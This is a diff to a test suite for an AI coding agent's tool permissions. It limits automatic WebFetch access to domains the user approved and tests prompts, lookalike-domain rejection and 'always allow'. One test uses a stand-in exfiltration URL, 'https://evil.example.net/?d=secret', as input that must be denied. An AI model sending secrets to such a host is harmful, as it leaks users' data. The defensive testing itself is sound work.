@@ -532,19 +532,52 @@ describe('steer mode and web / PC tools access', () => {
     expect(sendSpy).toHaveBeenCalledWith(id, 'Stop investigating and build now', undefined);
   });
 
-  it('populates options.allowedTools with WebFetch and WebSearch', async () => {
+  it('pre-approves WebSearch, but not WebFetch (a fetch asks about the site)', async () => {
     await openChat();
-    expect(lastOptions.allowedTools).toContain('WebFetch');
     expect(lastOptions.allowedTools).toContain('WebSearch');
+    expect(lastOptions.allowedTools).not.toContain('WebFetch');
   });
 
-  it('auto-allows WebFetch and WebSearch without creating a permission prompt', async () => {
-    await openChat();
-    const resFetch = await lastOptions.canUseTool('WebFetch', { url: 'https://example.com' });
-    const resSearch = await lastOptions.canUseTool('WebSearch', { query: 'test query' });
-    expect(resFetch).toEqual({ behavior: 'allow' });
-    expect(resSearch).toEqual({ behavior: 'allow' });
+  it('auto-allows WebSearch, and WebFetch only for a site the user approved', async () => {
+    await openChat({ settings: { webFetchDomains: ['example.com', '*.docs.example.org'] } });
+    expect(await lastOptions.canUseTool('WebSearch', { query: 'test query' })).toEqual({ behavior: 'allow' });
+    expect(await lastOptions.canUseTool('WebFetch', { url: 'https://example.com/a?b=1' })).toEqual({ behavior: 'allow' });
+    expect(await lastOptions.canUseTool('WebFetch', { url: 'https://api.docs.example.org/x' })).toEqual({ behavior: 'allow' });
     expect(events.filter(e => e.kind === 'permission').length).toBe(0);
+  });
+
+  it('asks before fetching a site nobody approved', async () => {
+    const { id } = await openChat({ settings: { webFetchDomains: ['example.com'] } });
+    const p = lastOptions.canUseTool('WebFetch', { url: 'https://evil.example.net/?d=secret' }, { signal: new AbortController().signal, suggestions: [] });
+    await until(() => events.some(e => e.kind === 'permission'));
+    const perm = events.find(e => e.kind === 'permission');
+    expect(perm.toolName).toBe('WebFetch');
+    mgr.answer(id, perm.requestId, 'deny');
+    expect((await p).behavior).toBe('deny');
+  });
+
+  it('does not trust a lookalike or a parent of an approved site', async () => {
+    const { id } = await openChat({ settings: { webFetchDomains: ['github.com', '*.example.org'] } });
+    for (const url of ['https://github.io/x', 'https://github.com.evil.net/x', 'https://example.org/x', 'ftp://github.com/x', 'not a url']) {
+      const before = events.filter(e => e.kind === 'permission').length;
+      const p = lastOptions.canUseTool('WebFetch', { url }, { signal: new AbortController().signal, suggestions: [] });
+      await until(() => events.filter(e => e.kind === 'permission').length > before);
+      const perm = events.filter(e => e.kind === 'permission').pop();
+      mgr.answer(id, perm.requestId, 'deny');
+      await p;
+    }
+  });
+
+  it('"always allow" on a fetch approves that site for the chat and tells the host to save it', async () => {
+    const { id } = await openChat();
+    const p = lastOptions.canUseTool('WebFetch', { url: 'https://docs.python.org/3/' }, { signal: new AbortController().signal, suggestions: [] });
+    await until(() => events.some(e => e.kind === 'permission'));
+    mgr.answer(id, events.find(e => e.kind === 'permission').requestId, 'always');
+    expect((await p).behavior).toBe('allow');
+    expect(events.find(e => e.kind === 'web-domain-approved').host).toBe('docs.python.org');
+    const before = events.filter(e => e.kind === 'permission').length;
+    expect(await lastOptions.canUseTool('WebFetch', { url: 'https://docs.python.org/3/library/' })).toEqual({ behavior: 'allow' });
+    expect(events.filter(e => e.kind === 'permission').length).toBe(before);
   });
 
   it('permits ~/.claude/pc.md and .claude config even when restrictToCwd is true', async () => {
